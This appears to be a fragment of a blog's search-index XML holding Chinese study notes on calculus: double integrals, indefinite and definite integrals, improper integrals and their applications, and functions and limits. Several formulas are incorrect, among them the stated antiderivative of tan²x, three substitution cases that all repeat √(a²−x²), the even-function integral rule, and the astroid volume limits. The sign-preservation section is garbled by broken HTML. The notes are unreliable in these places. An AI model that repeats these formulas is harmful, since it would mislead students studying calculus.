<script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\int_c^ddy\int_{x_1(y)}^{x_2(y)}f(x,y)dx</script><h3 id="利用极坐标计算"><a href="#利用极坐标计算" class="headerlink" title="利用极坐标计算"></a>利用极坐标计算</h3><p><strong>先r后$\theta$</strong><br>若积分域D可以用不等式$r_1(\theta)\le r\le r_2(\theta),\alpha\le\theta\le\beta$，来表示，则<br><img src="/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/2-1.png" alt="photo"></p>
<script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\int_\alpha^\beta d\theta\int_{r_1(\theta)}^{r_2(\theta)}f(r\cos\theta,r\sin\theta)rdr</script><h3 id="利用对称性和奇偶性计算"><a href="#利用对称性和奇偶性计算" class="headerlink" title="利用对称性和奇偶性计算"></a>利用对称性和奇偶性计算</h3><p>(1) 若积分域D关于y轴对称，f(x,y)关于x有奇偶性，则：</p>
<script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\begin{cases}
    2\iint_{D_{x\ge0}}f(x,y)d\sigma,&f(-x,y)=f(x,y) \\
    0,&f(-x,y)=-f(x,y)
\end{cases}</script><p>(1) 若积分域D关于x轴对称，f(x,y)关于y有奇偶性，则：</p>
<script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\begin{cases}
    2\iint_{D_{y\ge0}}f(x,y)d\sigma,&f(x,-y)=f(x,y) \\
    0,&f(x,-y)=-f(x,y)
\end{cases}</script><h3 id="利用变量对称性计算"><a href="#利用变量对称性计算" class="headerlink" title="利用变量对称性计算"></a>利用变量对称性计算</h3><p>二重积分$\iint_Df(x,y)d\sigma$的积分域D是点(x,y)的集合，记为$D_{(x,y)}$，类似一元定积分的值与积分变量用什么记号无关，则<br><img src="/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/3-1.png" alt="photo"></p>
<script type="math/tex; mode=display">\iint_{D_{(x,y)}}f(x,y)d\sigma=\iint_{D_{(y,x)}}f(y,x)d\sigma</script><p>即把二重积分的被积函数f(x,y)及积分域$D_{(x,y)}$中的x和y对调，积分值不变</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-一元函数积分学</title>
    <url>/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="不定积分"><a href="#不定积分" class="headerlink" title="不定积分"></a>不定积分</h2><h3 id="两个基本概念"><a href="#两个基本概念" class="headerlink" title="两个基本概念"></a>两个基本概念</h3><p><em>原函数</em><br>$F’(x)=f(x)$<br><em>不定积分</em><br>$\int f(x)dx=F(x)+C$</p>
<h3 id="原函数的存在性"><a href="#原函数的存在性" class="headerlink" title="原函数的存在性"></a>原函数的存在性</h3><p>(1) 若$f(x)$在区间$I$上连续，则$f(x)$在区间$I$上必有原函数<br>(2) 若$f(x)$在区间$I$上有第一类间断点，则$f(x)$在区间$I$上没有原函数<br>(3) 若$f(x)$在区间$I$上只有震荡间断点，则$f(x)$在区间$I$上可能存在原函数（专指不定积分）</p>
<h3 id="不定积分的性质"><a href="#不定积分的性质" class="headerlink" title="不定积分的性质"></a>不定积分的性质</h3><p><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/不定积分的性质.png" alt="photo"></p>
<h3 id="基本积分公式"><a href="#基本积分公式" class="headerlink" title="基本积分公式"></a>基本积分公式</h3><p><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/不定积分公式-1.png" alt="积分公式-1"><br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/不定积分公式-2.png" alt="积分公式-2"></p>
<p>(23) $\int\tan^2xdx=\sec^2x-1+C$</p>
<p>(24) $\int\arcsin xdx=x\arcsin x+\sqrt{1-x^2}$</p>
<p>(25) $\int_{-\infty}^{+\infty}e^{-x^2}dx=\sqrt{\pi}$</p>
<p>(26) $\int_{-\infty}^{+\infty}e^{-\frac{x^2}{a}}dx=\sqrt{a}\int_{-\infty}^{+\infty}e^{-(\frac{x}{\sqrt{a}})^2}d\frac{x}{\sqrt{a}}=\sqrt{a\pi}$</p>
<h3 id="三种主要积分法"><a href="#三种主要积分法" class="headerlink" title="三种主要积分法"></a>三种主要积分法</h3><h4 id="第一类换元法-凑微分"><a href="#第一类换元法-凑微分" class="headerlink" title="第一类换元法(凑微分)"></a>第一类换元法(凑微分)</h4><p>若$\int f(u)du=F(u)+C, and\varphi(x)$可导，则</p>
<script type="math/tex; mode=display">\int f(\varphi(x))\varphi'(x)dx=\int f(\varphi(x))d\varphi(x)=F(\varphi(x))+C</script><h4 id="第二类换元法"><a href="#第二类换元法" class="headerlink" title="第二类换元法"></a>第二类换元法</h4><p>设函数$x=\varphi(t)$可导，且$\varphi’(t)\ne0$,又设$\int f(\varphi(t))\varphi’(t)dt=F(t)+C$，则$\int f(x)dx=\int f(\varphi(t))\varphi’(t)dt=F(\varphi^{-1}(x))+C$</p>
<p>三种常用的变量代换<br>(1) 被积函数中含有$\sqrt{a^2-x^2}$时，令$x=a\sin t,or x = a\cos t$<br>(2) 被积函数中含有$\sqrt{a^2-x^2}$时，令$x=a\tan t$<br>(3) 被积函数中含有$\sqrt{a^2-x^2}$时，令$x=a\sec t$</p>
<h4 id="分部积分法"><a href="#分部积分法" class="headerlink" title="分部积分法"></a>分部积分法</h4><p>设$u(x),v(x)$有连续一阶导数，则$\int udv=uv-\int vdu$</p>
<h3 id="三类常见可积函数积分"><a href="#三类常见可积函数积分" class="headerlink" title="三类常见可积函数积分"></a>三类常见可积函数积分</h3><h4 id="有理函数积分"><a href="#有理函数积分" class="headerlink" title="有理函数积分"></a>有理函数积分</h4><h4 id="三角有理式积分"><a href="#三角有理式积分" class="headerlink" title="三角有理式积分"></a>三角有理式积分</h4><script type="math/tex; mode=display">\int R(\sin x,\cos x)dx</script><p>(1) 一般方法（万能代换）<br>令$\tan\frac{x}{2}=t$<br>$\sin\alpha=\frac{2\tan\frac{\alpha}{2}}{1+\tan^2\frac{\alpha}{2}}、\cos\alpha=\frac{1-\tan^2\frac{\alpha}{2}}{1+\tan^2\frac{\alpha}{2}}、dx=\frac{2dt}{1+t^2}$</p>
<script type="math/tex; mode=display">\int R(\sin x,\cos x)dx=\int R(\frac{2t}{1+t^2},\frac{1-t^2}{1+t^2})\frac{2}{1+t^2}du</script><p>(2) 特殊方法（三角变形，换元，分部）</p>
<ol>
<li>若$R(-\sin x,\cos x)=-R(\sin x,\cos x)$，则令$u=\cos x$，即凑$d\cos x$</li>
<li>若$R(\sin x,-\cos x)=-R(\sin x,\cos x)$，则令$u=\sin x$，即凑$d\sin x$</li>
<li>若$R(-\sin x,-\cos x)=R(\sin x,\cos x)$，则令$u=\tan x$，即凑$d\tan x$</li>
</ol>
<h4 id="简单无理函数积分"><a href="#简单无理函数积分" class="headerlink" title="简单无理函数积分"></a>简单无理函数积分</h4><script type="math/tex; mode=display">\int R(x,\sqrt[n]{\frac{ax+b}{cx+d}})dx</script><p>令$\sqrt[n]{\frac{ax+b}{cx+d}}=t$，将其化为有理函数积分进行计算</p>
<h2 id="定积分"><a href="#定积分" class="headerlink" title="定积分"></a>定积分</h2><h3 id="定积分的概念"><a href="#定积分的概念" class="headerlink" title="定积分的概念"></a>定积分的概念</h3><h3 id="定积分的几何意义"><a href="#定积分的几何意义" class="headerlink" title="定积分的几何意义"></a>定积分的几何意义</h3><ol>
<li>设$\int_a^bf(x)dx$存在，若在[a,b]上$f(x)\ge0$，则$\int_a^bf(x)dx$的值等于以曲线$y=f(x)$，$y=a,x=b$及x轴所围成的曲边梯形的面积</li>
<li>若在[a,b]上$f(x)\le0$，则$\int_a^bf(x)dx$的值等于以曲线$y=f(x),x=a,x=b$及x轴所围成的曲边梯形面积的负值</li>
<li>若在[a,b]上$f(x)$的值有正也有负，则$\int_a^bf(x)dx$在几何上表示$y=f(x),x=a,x=b$及x轴所围成的x轴上方图形的面积减去下方图形的面积所得之差</li>
</ol>
<h3 id="可积性"><a href="#可积性" class="headerlink" title="可积性"></a>可积性</h3><p><strong>必要条件</strong><br>若$\int_a^bf(x)dx$存在，则$f(x)$在[a,b]上有界</p>
<p><strong>充分条件</strong><br>(1) 若$f(x)$在[a,b]上连续，则$\int_a^bf(x)dx$必定存在<br>(2) 若$f(x)$在[a,b]上有界，且只有有限个间断点，则$\int_a^bf(x)dx$必定存在<br>(3) 若$f(x)$在[a,b]上只有有限个第一类间断点，则$\int_a^bf(x)dx$必定存在</p>
<p>f(x)在[a,b]上可积，则$\int_a^xf(t)dt$连续</p>
<h3 id="定积分的计算"><a href="#定积分的计算" class="headerlink" title="定积分的计算"></a>定积分的计算</h3><p><strong>牛顿莱布尼茨公式</strong><br>如果函数$F(x)$是连续函数$f(x)$在区间[a,b]上的一个原函数，则$\int_a^bf(x)dx=F(b)-F(a)$</p>
<p><strong>换元积分法</strong><br>设f(x)在区间[a,b]上连续，函数$x=\varphi(t)满足以下条件$：<br>(1) $\varphi(\alpha)=a,\varphi(\beta)=b$</p>
<p>(2) $\varphi(t)$在$<a href="or[\beta,\alpha]">\alpha,\beta</a>$上具有连续导数，且其值域$R_\varphi=[a,b]$，则</p>
<script type="math/tex; mode=display">\int_a^bf(x)dx=\int_\alpha^\beta f(\varphi(t))\varphi'(t)dt</script><p><strong>分部积分法</strong><br>设函数$u(x)、v(x)$在[a,b]上有连续一阶导数，则$\int_a^budv=uv|\overset{b}{a}-\int_a^bvdu$</p>
<p><strong>利用奇偶性和周期性</strong><br>(1) 设$f(x)$为[-a,a]上的连续函数(a&gt;0)，则</p>
<script type="math/tex; mode=display">\int_{-a}^a=\begin{cases}
    0,&f(x)为奇函数\\
    2\int_a^bf(x)dx,&f(x)为偶函数
\end{cases}</script><p>(2) 设$f(x)$是以T为周期的连续函数，则对任给数a，总有$\int_a^{a+T}f(x)dx=\int_0^Tf(x)dx$</p>
<p><strong>利用公式</strong><br>(1) <script type="math/tex">\int_0^{\frac{\pi}{2}}\sin^nxdx=\int_0^\frac{\pi}{2}\cos^nxdx=\begin{cases}
    \frac{n-1}{n}\cdot\frac{n-3}{n-2}\cdot\dotsb\cdot\frac{1}{2}\cdot\frac{\pi}{2},&n为偶数\\
    \frac{n-1}{n}\cdot\frac{n-3}{n-2}\cdot\dotsb\cdot\frac{2}{3},&n为大于1的奇数
\end{cases}</script><br>(2) $\int_0^\pi xf(\sin x)dx=\frac{\pi}{2}\int_0^\pi f(\sin x)dx$(其中$f(x)$连续)</p>
<h3 id="变上限积分：-int-a-xf-t-dt"><a href="#变上限积分：-int-a-xf-t-dt" class="headerlink" title="变上限积分：$\int_a^xf(t)dt$"></a>变上限积分：$\int_a^xf(t)dt$</h3><p><strong>定理</strong><br>若$f(x)$在[a,b]上连续，则$\int_a^xf(t)dt$在[a,b]上可导且$(\int_a^xf(t)dt)’=f(x)$</p>
<p><em>有关$F(x)=\int_a^xf(t)dt$在一点处的可导性的结论</em><br>| $f(x)$ | $F(x)=\int_a^xf(t)dt$ |<br>| —- | —- |<br>|连续|可导，且$F’(x_0)=f(x_0)$|<br>|可去间断|可导，且$F’(x_0)=\lim\limits_{x\rightarrow x_0}f(x)$|<br>|跳跃间断|连续但不可导，且$F_+’(x_0)=f(x_0^+),F_-‘(x_0)=f(x_0^-)$|</p>
<p><strong>变上限求导的三个类型</strong><br>(1) $(\int_{\varphi(x)}^{\psi(x)}f(t)dt)’= f(\psi(x))\psi’(x)-f(\varphi(x))\varphi’(x)$</p>
<p>(2) $(\int_a^bf(x,t)dt)’=\int_a^b\frac{\vartheta f(x,t)}{\vartheta x}dt$</p>
<p><strong>连续性</strong><br>设$f(x)$在[a,b]上可积，则$\int_a^xf(x)dt$在[a,b]上连续</p>
<p><strong>奇偶性</strong><br>(1) 若$f(x)$为奇函数，则$\int_a^xf(t)dt$为偶函数</p>
<p>(2) 若$f(x)$为偶函数，则$\int_0^xf(t)dt$为奇函数</p>
<h3 id="定积分的性质"><a href="#定积分的性质" class="headerlink" title="定积分的性质"></a>定积分的性质</h3><p><strong>不等式</strong><br>(1) 若$f(x)\le g(x),x\in[a,b]$，则$\int_a^bf(x)dx\le\int_a^bg(x)dx$</p>
<p>(2) 若$f(x)$在[a,b]上连续，则$m(b-a)\le\int_a^bf(x)dx\le M(b-a)$，其中m,M分别为$f(x)$在[a,b]上的最小值与最大值</p>
<p>(3) $|\int_a^bf(x)dx|\le\int_a^b|f(x)|dx$</p>
<p><strong>积分中值定理</strong><br>(1) 若$f(x)$在[a,b]上连续，则$\int_a^bf(x)dx=f(\xi)(b-a),a&lt;\xi&lt;b$</p>
<p>(2) 若$f(x),g(x)$在[a,b]上连续，且$g(x)$不变号，则$\int_a^bf(x)g(x)dx=f(\xi)\int_a^bg(x)dx,a\le\xi\le b$</p>
<h3 id="积分不等式"><a href="#积分不等式" class="headerlink" title="积分不等式"></a>积分不等式</h3><p>柯西积分不等式：$(\int_a^bf(x)g(x)dx)^2\le\int_a^bf^2(x)dx\int_a^bg^2(x)dx$</p>
<h2 id="反常积分"><a href="#反常积分" class="headerlink" title="反常积分"></a>反常积分</h2><h3 id="无穷区间上的反常积分"><a href="#无穷区间上的反常积分" class="headerlink" title="无穷区间上的反常积分"></a>无穷区间上的反常积分</h3><p><strong>定义</strong> 设$f(x)$为$(-\infty,+\infty)$上的连续函数，如果反常积分$\int_{-\infty}^0f(x)dx$和$\int_0^{+\infty}f(x)dx$都收敛，则称反常积分$\int_{-\infty}^{+\infty}f(x)dx$收敛，且$\int_{-\infty}^{+\infty}f(x)dx=\int_{-\infty}^0f(x)dx+\int_0^{+\infty}f(x)dx$<br>如果$\int_{-\infty}^0f(x)dx$与$\int_0^{+\infty}f(x)dx$之一发散，则称$\int_{-\infty}^{+\infty}f(x)dx$发散</p>
<p><strong>定理1（比较判别法）</strong> 设$f(x),g(x)$在$[a,+\infty)$上连续，且$0\le f(x)\le g(x)$，且</p>
<p>(1) 当$\int_a^{+\infty}g(x)dx$收敛时，$\int_a^{+\infty}f(x)dx$收敛</p>
<p>(2) 当$\int_a^{+\infty}f(x)dx$发散时，$\int_a^{+\infty}g(x)dx$发散</p>
<p><strong>定理2（比较法的极限形式）</strong> 设$f(x),g(x)$在$[a,+\infty)$上非负连续，且$\lim\limits_{x\rightarrow+\infty}\frac{f(x)}{g(x)}=\lambda$(有限或无穷)，则</p>
<p>(1) 当$\lambda\ne0$时，$\int_a^{+\infty}f(x)dx$与$\int_a^{+\infty}g(x)dx$同敛散</p>
<p>(2) 当$\lambda=0$时，若$\int_a^{+\infty}g(x)dx$收敛，则$\int_a^{+\infty}f(x)dx$也收敛</p>
<p>(3) 当$\lambda=+\infty$时，若$\int_a^{+\infty}g(x)dx$发散，则$\int_a^{+\infty}f(x)dx$也发散</p>
<p>常用结论：<script type="math/tex">\int_a^{+\infty}\frac{1}{x^p}dx\begin{cases}
    p>1,&收敛 \\
    p\le1,&发散
\end{cases}\tag{a>0}</script></p>
<h3 id="无界函数的反常积分"><a href="#无界函数的反常积分" class="headerlink" title="无界函数的反常积分"></a>无界函数的反常积分</h3><p><strong>定理1（比较判别法</strong> 设$f(x),g(x)$在$(a,b]$上连续，且$0\le f(x)\le g(x),x=a$为$f(x)$和$g(x)$的瑕点，则<br>(1) 当$\int_a^bg(x)dx$收敛时，$\int_a^bf(x)dx$收敛<br>(2) 当$\int_a^bf(x)dx$发散时，$\int_a^bg(x)dx$发散</p>
<p><strong>定理2（比较法的极限形式</strong> 设$f(x),g(x)$在$(a,b]$上非负连续，且$\lim\limits_{x\rightarrow a^+}\frac{f(x)}{g(x)}=\lambda$(有限或无穷)，则<br>(1) 当$\lambda\ne0$时，$\int_a^{b}f(x)dx$与$\int_a^{b}g(x)dx$同敛散<br>(2) 当$\lambda=0$时，若$\int_a^bg(x)dx$收敛，则$\int_a^bf(x)dx$也收敛<br>(3) 当$\lambda=+\infty$时，若$\int_a^bg(x)dx$发散，则$\int_a^bf(x)dx$也发散</p>
<p>常用结论：</p>
<script type="math/tex; mode=display">\int_a^b\frac{1}{(x-a)^p}dx\begin{cases}
    p<1,&收敛 \\
    p\ge1,&发散
\end{cases}</script><script type="math/tex; mode=display">\int_a^b\frac{1}{(b-x)^p}dx\begin{cases}
    p<1,&收敛 \\
    p\ge1,&发散
\end{cases}</script><h2 id="定积分应用"><a href="#定积分应用" class="headerlink" title="定积分应用"></a>定积分应用</h2><h3 id="几何应用"><a href="#几何应用" class="headerlink" title="几何应用"></a>几何应用</h3><p><strong>平面图形的面积</strong><br>设有平面域D,则该平面域D的面积为$\iint_D1d\sigma$<br>(1) 若平面域D由曲线$y=f(x),y=g(x)(f(x)\ge g(x)),x=a,x=b(a&lt;b)$所围成，则<br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/平面图形面积-1.png" alt="photo"></p>
<script type="math/tex; mode=display">S=\iint_D1d\sigma=\int_a^bdx\int_{g(x)}^{f(x)}1dy=\int_a^b[f(x)-g(x)]dx</script><p>(2) 若平面域D由曲线$r=r(\theta),\theta=\alpha,\theta=\beta(\alpha&lt;\beta)$所围成，则面积为<br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/平面图形面积-2.png" alt="photo"></p>
<script type="math/tex; mode=display">S=\iint_D1d\sigma=\int_\alpha^\beta d\theta\int_0^{r(\theta)}rdr=\frac{1}{2}\int_\alpha^\beta r^2(\theta)d\theta</script><p><strong>空间体的体积</strong><br>(1) 旋转体的体积<br>平面域D绕直线L:ax+by+c=0(该直线不穿过区域D)旋转所得旋转体体积记为V<br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/旋转体体积-1.png" alt="photo"></p>
<script type="math/tex; mode=display">r(x,y)=\frac{|ax+by+c|}{\sqrt{a^2+b^2}}</script><script type="math/tex; mode=display">dV=2\pi r(x,y)d\sigma</script><script type="math/tex; mode=display">V=2\pi\iint_Dr(x,y)d\sigma</script><p>特别的，若区域D由曲线$y=f(x)(f(x)\ge0$和直线$x=a,x=b(0\le a\le b)$及x轴所围成，则<br>(1) 区域D绕x轴旋转$(r(x,y)=y)$一周所得旋转体的体积为</p>
<script type="math/tex; mode=display">V_x=2\pi \iint_Dyd\sigma=2\pi\int_a^bdx\int_0^{f(x)}ydy=\pi\int_a^bf^2(x)dx</script><p>(2) 区域D绕y轴旋转$(r(x,y)=x)$一周所得旋转体的体积为</p>
<script type="math/tex; mode=display">V_y=2\pi\iint_Dxd\sigma=2\pi\int_a^bdx\int_0^{f(x)}xdy=2\pi\int_a^bxf(x)dx</script><p>(2) 横截面面积的体积<br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/横截面面积的体积.png" alt="photo"></p>
<script type="math/tex; mode=display">V=\int_a^bS(x)dx</script><p><strong>曲线弧长</strong><br>(1) 设曲线段C由直角坐标方程$y=f(x)(a\le x\le b)$给出，其中$y(x)$在[a,b]上有一阶连续导数，则该曲线段的弧长为</p>
<script type="math/tex; mode=display">s=\int_a^b\sqrt{1+y'^2}dx</script><p>(2) 设曲线段C由参数方程$\begin{cases}<br>    x=x(t),\\<br>    y=y(t),<br>\end{cases}(a\le t\le \beta)$给出，其中$x(t),y(t)$在$[\alpha,\beta]$上有一阶连续导数，则该曲线段的弧长为</p>
<script type="math/tex; mode=display">s=\int_\alpha^\beta\sqrt{x'^2(t)+y'^2(t)}dt</script><p>(3) 设曲线段C由极坐标方程$r=r(\theta)(\alpha\le\theta\beta)$给出，其中$r(\theta)$在$[\alpha,\beta]$上有一阶连续导数，则该曲线段的弧长为</p>
<script type="math/tex; mode=display">s=\int_\alpha^\beta\sqrt{r^2(\theta)+r'^2(\theta)}d\theta</script><p>(4) 旋转体侧面积<br>曲线$y=f(x)(f(x)\ge0)$和直线$x=a,x=b(0\le a\le b)$及x轴所围成区域绕x轴旋转所得旋转体的侧面积是</p>
<script type="math/tex; mode=display">S=2\pi\int_a^bf(x)\sqrt{1+f'^2(x)}dx</script><h4 id="特殊图形"><a href="#特殊图形" class="headerlink" title="特殊图形"></a>特殊图形</h4><p><strong>星形线</strong><br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/星形线.png" alt="星形线"><br>直角坐标方程：$x^{\frac{2}{3}}+y^{\frac{2}{3}}=a^{\frac{2}{3}}$<br>极坐标方程：$x=a\cos^3t,y=a\sin^3t$<br>围成面积$A=4\int_0^aydx$<br>弧长$L=4\int_0^a\sqrt{1+y’^2}dx$<br>绕x轴体积$V=2\pi\int_a^a y^2dx$<br>旋转体横截面积$2*2\pi\int_0^ay\sqrt{1+y’^2}dx$</p>
<p><strong>摆线</strong><br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/摆线.png" alt="摆线"><br>极坐标方程：$x=a(t-\sin t),y=a(1-\cos t)$</p>
<p><strong>心形线</strong><br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/心形线.png" alt="心形线"><br>极坐标方程：$r=a(1+\cos\theta)$</p>
<p><strong>双纽线</strong><br><img src="/2021/05/23/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86%E5%AD%A6/双纽线.png" alt="双纽线"><br>直角坐标方程：$(x^2+y^2)^2=a^2(x^2-y^2)$<br>极坐标方程：$r^2=a^2\cos2\theta$<br>旋转体侧面积：$2\int_0^\frac{\pi}{4}2\pi*r\sin\theta\sqrt{r^2+r’^2(\theta)}d\theta$</p>
<h3 id="物理应用"><a href="#物理应用" class="headerlink" title="物理应用"></a>物理应用</h3><ol>
<li>压力<ol>
<li>水的压力F=水的压强P x 装水的容器的底面积S（F=pghS)</li>
</ol>
</li>
<li>变力做功</li>
<li>引力</li>
</ol>
<p>质心计算公式$r_\sigma=\frac{\sum_im_ir_i}{M}$和$r_\sigma=\frac{\int^b_ax\rho(x)dx}{\int^b_a\rho(x)dx}$</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-函数、连续、极限</title>
    <url>/2021/05/07/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E5%87%BD%E6%95%B0%E3%80%81%E8%BF%9E%E7%BB%AD%E3%80%81%E6%9E%81%E9%99%90/</url>
    <content><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>反函数</strong><br>同一直角坐标系中，$y=f(x)$和$x=f^{-1}(y)$的图形重合，$y=f(x)$和$y=f^{-1}(x)$的图形关于直线$y=x$对称</p>
<p>$f^{-1}(f(x))=x,f(f^{-1}(x))=x$</p>
<h3 id="函数的性态"><a href="#函数的性态" class="headerlink" title="函数的性态"></a>函数的性态</h3><h4 id="单调性"><a href="#单调性" class="headerlink" title="单调性"></a>单调性</h4><p><strong>定义</strong> 设函数 $y=f(x)$ 在某区间I上有定义，如果对于区间I上的任意两点 $x_1,x_2$ ，当 $x_1 &lt; x_2$ 时，恒有 $f(x_1) &lt; f(x_2)$ (或 $f(x_1) &gt; f(x_2)$ )，则称函数 $y=f(x)$ 在区间I上单调增加(或单调减少)<br>如果对于区间I上的任意两点 $x_1,x_2$ ，当 $x_1&lt;x_2$ 时，恒有 $f(x_1)\le f(x_2)$ (或 $f(x_1)\ge f(x_2)$ )，则称函数$y=f(x)$在区间I上单调不减(或单调不增)</p>
<p><strong>判定</strong></p>
<ol>
<li>利用定义</li>
<li>利用导数<br>设f(x)在区间I上可导，则<br>(1)$f’(x)&gt;0(&lt;0)\Leftarrow f(x)$单调增(单调减)<br> (2) $f’(x)\ge0(\le0)\Leftrightarrow f(x)$单调不减（单调不整）</li>
</ol>
<span id="more"></span>
<h4 id="奇偶性"><a href="#奇偶性" class="headerlink" title="奇偶性"></a>奇偶性</h4><p><strong>定义</strong> 设函数$y=f(x)$的定义域D关于原点对称(即若$x\in D$，则有$-x\in D$)，如果对于任一$-x\in D$，恒有$f(-x)=f(x)$，则称f(x)为D上的偶函数；如果恒有$f(-x)=-f(x)$，则称f(x)为D上的奇函数</p>
<p><strong>判定</strong></p>
<ol>
<li>利用定义</li>
<li>设f(x)可导，则<br>(1) f(x)是奇函数$\Rightarrow f’(x)$是偶函数<br>(2) f(x)是偶函数$\Rightarrow f’(x)$是奇函数</li>
<li>连续的奇函数其原函数都是偶函数</li>
<li>连续的偶函数其原函数中有唯一一个是奇函数</li>
</ol>
<p>注：<br>(1) 若f(x)是奇函数，则$\int_0^xf(t)dt$是偶函数<br>(2) 若f(x)是偶函数，则$\int_0^xf(t)dt$是奇函数</p>
<h4 id="周期性"><a href="#周期性" class="headerlink" title="周期性"></a>周期性</h4><p><strong>定义</strong> 若存在实数T&gt;0,对于任意x,恒有$f(x+T)=f(x)$,则称y=f(x)为周期函数，使得上述关系式成立的最小正数T称为f(x)的最小正周期，简称为函数f(x)的周期</p>
<p><strong>判定</strong></p>
<ol>
<li>利用定义</li>
<li>可导的周期函数及其导函数为周期函数</li>
<li>周期函数的原函数不一定是周期函数（如$1+cosx$)</li>
</ol>
<p>注：<br>(1) 设f(x)连续且以T为周期，则$F(x)=\int_0^xf(t)dt$是以T为周期的周期函数$\Leftrightarrow\int_0^Tf(x)dx=0$<br>(2) 周期函数的原函数是周期函数的充要条件是其在一个周期上的积分为零</p>
<h4 id="有界性"><a href="#有界性" class="headerlink" title="有界性"></a>有界性</h4><p><strong>定义</strong> 若$\exists M&gt;0,\forall x\in I,|f(x)|\le M$，则称f(x)在I上有界</p>
<p><strong>判定</strong></p>
<ol>
<li>利用定义</li>
<li>f(x)在[a,b]上连续$\Rightarrow f(x)$在[a,b]上有界</li>
<li>f(x)在(a,b)上连续，且$f(a^+)$和$f(b^-)$存在$\Rightarrow f(x)$在(a,b)上有界；</li>
<li>$f’(x)$在区间I（有限）上有界$\Rightarrow f(x)$在I上有界</li>
</ol>
<h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h2><h3 id="极限的概念"><a href="#极限的概念" class="headerlink" title="极限的概念"></a>极限的概念</h3><h4 id="数列极限"><a href="#数列极限" class="headerlink" title="数列极限"></a>数列极限</h4><p>$\lim\limits_{n\rightarrow\infty}x_n=a:\forall\varepsilon&gt;0,\exists N(\varepsilon)&gt;0.$当n &gt; N时，有$|x_n-a|&lt;\varepsilon$</p>
<h3 id="极限的性质"><a href="#极限的性质" class="headerlink" title="极限的性质"></a>极限的性质</h3><h4 id="局部有界性"><a href="#局部有界性" class="headerlink" title="局部有界性"></a>局部有界性</h4><p>若极限$\lim\limits_{x\rightarrow x_0}f(x)$存在，则f(x)在点$x_0$某去心邻域内有界</p>
<h4 id="保号性-重点"><a href="#保号性-重点" class="headerlink" title="保号性(重点)"></a>保号性(重点)</h4><p>设$\lim\limits_{x\rightarrow x_0}f(x)=A$，则<br>(1) 若$A&gt;0(orA<0)$，则$\exists \delta>0$，当$x\in\mathring{U}(x_0,\delta)$时，$f(x)&gt;0(orf(x)<0)$(不能改为$\ge or \le$，例$\lim\limits_{x\rightarrow0}x="0$)" (2) 若$\exists\delta>0$，当$x\in\mathring{U}(x_0,\delta)$时，$f(x)\ge0(orf(x)\le0)\Rightarrow A\ge0(orA\le0)$(不能改为$&gt;or&lt;$，例$\frac{1}{n}&gt;0$)</0)$(不能改为$\ge></0)$，则$\exists></p>
<p>注：由保号性不难得到保序性：设$\lim\limits_{x\rightarrow x_0}f(x)=A,\lim\limits_{x\rightarrow x_0}g(x)=B$，则<br>(1) 若$A&gt;B\Rightarrow\exists\delta&gt;0$,当$x\in\mathring{U}(x_0,\delta)$时，$f(x)&gt;g(x)$(同样不能改)<br>(2) 若$\exists\delta&gt;0$，当$x\in\mathring{U}(x_0,\delta)$时，$f(x)\ge g(x)\Rightarrow A\ge B$(同样不能改)</p>
